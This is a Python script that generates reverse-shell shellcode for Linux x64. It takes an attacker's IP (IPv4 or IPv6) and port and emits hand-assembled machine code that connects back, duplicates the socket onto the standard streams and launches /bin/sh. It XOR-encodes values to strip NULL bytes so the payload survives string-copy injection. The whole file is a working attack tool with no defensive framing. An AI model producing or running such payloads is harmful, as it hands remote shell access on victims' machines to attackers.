#!/usr/bin/python3
import socket
import struct
import sys
import random

def has_null(v):
    return b'\x00' in struct.pack('<Q', v)

def xor_encode(val_int):
    """Encodes a 64-bit value using XOR to avoid NULL bytes."""
    while True:
        key = random.getrandbits(64)
        xor_val = val_int ^ key
        if not has_null(key) and not has_null(xor_val):
            break
    
    # MOV RBX, xor_val; MOV RCX, key; XOR RCX, RBX; PUSH RCX
    return (
        "48bb" + struct.pack('<Q', xor_val).hex() +
        "48b9" + struct.pack('<Q', key).hex() +
        "4831d9" +
        "51"
    )

def push_qword(val_int):
    """Generates shellcode to push a 64-bit value, handling NULL bytes."""
    if not has_null(val_int):
        # MOV RAX, IMM; PUSH RAX
        return "48b8" + struct.pack('<Q', val_int).hex() + "50"
    else:
        return xor_encode(val_int)

def get_rev_hex_ipv4(ip, port):
    # ipv4 implementation (refactored)
    family = 0x0002
    port_net = struct.pack('>H', port)
    ip_net = socket.inet_aton(ip)
    
    full_bytes = struct.pack('<H', family) + port_net + ip_net # 8 bytes
    val_int = struct.unpack('<Q', full_bytes)[0]
    
    push_sockaddr = push_qword(val_int)
    
    # 3. Assemble full shellcode (Linux x64)
    # socket(AF_INET, SOCK_STREAM, 0)
    shellcode = (
        "6a29"                      # push 41
        "58"                        # pop rax
        "6a02"                      # push 2 (AF_INET)
        "5f"                        # pop rdi
        "6a01"                      # push 1 (SOCK_STREAM)
        "5e"                        # pop rsi
        "99"                        # cdq (rdx = 0)
        "0f05"                      # syscall
        
        "4889c7"                    # mov rdi, rax (save sockfd)
        
        + push_sockaddr +           # Push sockaddr_in structure
        
        "4889e6"                    # mov rsi, rsp (pointer to sockaddr)
        "6a10"                      # push 16 (sizeof sockaddr_in)
        "5a"                        # pop rdx
        "6a2a"                      # push 42 (sys_connect)
        "58"                        # pop rax
        "0f05"                      # syscall
        
        # dup2 loop
        "6a03"                      # push 3
        "5e"                        # pop rsi
        "48ffce"                    # dec rsi
        "6a21"                      # push 33 (sys_dup2)
        "58"                        # pop rax
        "0f05"                      # syscall
        "75f6"                      # jnz (loop)
        
        # execve("/bin//sh", 0, 0)
        "4831f6"                    # xor rsi, rsi
        "56"                        # push rsi
        "48bb2f62696e2f2f7368"      # mov rbx, 0x68732f2f6e69622f
        "53"                        # push rbx
        "54"                        # push rsp
        "5f"                        # pop rdi
        "99"                        # cdq
        "6a3b"                      # push 59 (sys_execve)
        "58"                        # pop rax
        "0f05"                      # syscall
    )
    return shellcode

def get_rev_hex_ipv6(ip, port):
    # IPv6 Implementation
    # struct sockaddr_in6 {
    #    sa_family_t     sin6_family;   // 2 bytes (AF_INET6 = 10)
    #    in_port_t       sin6_port;     // 2 bytes
    #    uint32_t        sin6_flowinfo; // 4 bytes (0)
    #    struct in6_addr sin6_addr;     // 16 bytes
    #    uint32_t        sin6_scope_id; // 4 bytes (0)
    # } Total: 28 bytes
    
    try:
        ip_bytes = socket.inet_pton(socket.AF_INET6, ip)
    except OSError:
        print("[-] Invalid IPv6 address")
        return ""

    port_bytes = struct.pack('>H', port)
    family_bytes = struct.pack('<H', 10) # AF_INET6 = 10
    flow_bytes = b'\x00\x00\x00\x00'
    scope_bytes = b'\x00\x00\x00\x00'

    # Construct the struct in memory (28 bytes)
    # We need to push it onto the stack in REVERSE order.
    # To align stack and avoid issues, we can push 4 QWORDS (32 bytes).
    # The last 4 bytes (after scope_id) don't matter, or we can just push 0s.
    
    # Let's visualize the stack (growing down):
    # High Addr
    # [Padding (4 bytes)] - Optional, but keeps alignment clean
    # [Scope ID (4 bytes)]
    # [Address Low (8 bytes)]
    # [Address High (8 bytes)]
    # [Flow (4)] [Port (2)] [Family (2)] -> Low Addr (RSP points here)
    
    # We will construct 4 QWORDS (32 bytes total) to cover the 28 bytes structure.
    # QWORD 4 (Top): Scope ID + Padding
    # QWORD 3: Address Part 2 (Last 8 bytes of IP)
    # QWORD 2: Address Part 1 (First 8 bytes of IP)
    # QWORD 1: Family + Port + Flowinfo
    
    # Wait, struct layout (Low to High):
    # Offset 0: Family (2)
    # Offset 2: Port (2)
    # Offset 4: Flow (4)
    # Offset 8: IP (16)
    # Offset 24: Scope (4)
    
    # We push in REVERSE order (QWORD 4 -> QWORD 1)
    
    # QWORD 4 (Offsets 24-31): Scope (4 bytes) + Padding (4 bytes)
    q4_bytes = scope_bytes + b'\x00\x00\x00\x00'
    q4_val = struct.unpack('<Q', q4_bytes)[0]
    
    # QWORD 3 (Offsets 16-23): IP[8:16]
    q3_val = struct.unpack('<Q', ip_bytes[8:16])[0]
    
    # QWORD 2 (Offsets 8-15): IP[0:8]
    q2_val = struct.unpack('<Q', ip_bytes[0:8])[0]
    
    # QWORD 1 (Offsets 0-7): Family(2) + Port(2) + Flow(4)
    # Note: struct.pack simply concatenates. 
    # Warning: Flowinfo is 4 bytes. 
    # Low addr: Family(2) | Port(2) | Flow(4)
    q1_bytes = family_bytes + port_bytes + flow_bytes
    q1_val = struct.unpack('<Q', q1_bytes)[0]
    
    # Generate PUSH instructions
    payload_push = ""
    payload_push += push_qword(q4_val) # Push Scope + Padding
    payload_push += push_qword(q3_val) # Push IP Part 2
    payload_push += push_qword(q2_val) # Push IP Part 1
    payload_push += push_qword(q1_val) # Push Header
    
    shellcode = (
        # socket(AF_INET6, SOCK_STREAM, 0)
        "6a29"                      # push 41
        "58"                        # pop rax
        "6a0a"                      # push 10 (AF_INET6)
        "5f"                        # pop rdi
        "6a01"                      # push 1 (SOCK_STREAM)
        "5e"                        # pop rsi
        "99"                        # cdq (rdx = 0)
        "0f05"                      # syscall
        
        "4889c7"                    # mov rdi, rax (save sockfd)
        
        + payload_push +            # Push sockaddr_in6 structure
        
        "4889e6"                    # mov rsi, rsp (pointer to sockaddr_in6)
        "6a1c"                      # push 28 (sizeof sockaddr_in6)
        "5a"                        # pop rdx
        "6a2a"                      # push 42 (sys_connect)
        "58"                        # pop rax
        "0f05"                      # syscall
        
        # dup2 loop
        "6a03"                      # push 3
        "5e"                        # pop rsi
        "48ffce"                    # dec rsi
        "6a21"                      # push 33 (sys_dup2)
        "58"                        # pop rax
        "0f05"                      # syscall
        "75f6"                      # jnz (loop)
        
        # execve("/bin//sh", 0, 0)
        "4831f6"                    # xor rsi, rsi
        "56"                        # push rsi
        "48bb2f62696e2f2f7368"      # mov rbx, 0x68732f2f6e69622f
        "53"                        # push rbx
        "54"                        # push rsp
        "5f"                        # pop rdi
        "99"                        # cdq
        "6a3b"                      # push 59 (sys_execve)
        "58"                        # pop rax
        "0f05"                      # syscall
    )
    
    return shellcode

# --- INTERACTIVE INPUT ---
try:
    print("--- SHELLCODE GENERATOR (IPv4/IPv6) ---")
    my_ip = input("Enter LHOST (IP): ").strip()
    if not my_ip: my_ip = "127.0.0.1"
    
    my_port_str = input("Enter LPORT (Default 4444): ").strip()
    my_port = int(my_port_str) if my_port_str else 4444

    # Detect IP version
    if ':' in my_ip:
        print("[*] Detected IPv6 address.")
        raw_hex = get_rev_hex_ipv6(my_ip, my_port)
    else:
        print("[*] Detected IPv4 address.")
        raw_hex = get_rev_hex_ipv4(my_ip, my_port)
        
    print(f"\n[*] Generated Shellcode for {my_ip}:{my_port}")
    print(f"[*] Size: {len(raw_hex)//2} bytes")
    if "00" in raw_hex:
        print("[!] WARNING: NULL bytes detected (bad for strcpy, good for XOR loader).")
    else:
        print("[+] SUCCESS: No NULL bytes detected.")
        
    print(f"\nPayload:\n{raw_hex}")

except Exception as e:
    print(f"Error: {e}")
